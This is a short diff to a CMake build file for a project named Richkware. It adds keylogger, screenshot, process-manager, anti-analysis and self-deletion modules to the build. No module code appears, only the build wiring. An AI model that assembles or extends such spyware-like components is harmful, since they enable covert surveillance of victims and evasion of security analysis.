@@ -77,8 +77,15 @@ file(GLOB_RECURSE RICHKWARE_SOURCES
     "src/utils/*.cpp"
 )
 
-# Ensure file_manager.cpp is included
-list(APPEND RICHKWARE_SOURCES "src/modules/file_manager.cpp")
+# Ensure all module files are included
+list(APPEND RICHKWARE_SOURCES
+    "src/modules/file_manager.cpp"
+    "src/modules/keylogger.cpp"
+    "src/modules/screenshot.cpp"
+    "src/modules/process_manager.cpp"
+    "src/modules/anti_analysis.cpp"
+    "src/modules/self_deletion.cpp"
+)
 
 file(GLOB_RECURSE RICHKWARE_HEADERS
     "include/richkware/*.hpp"
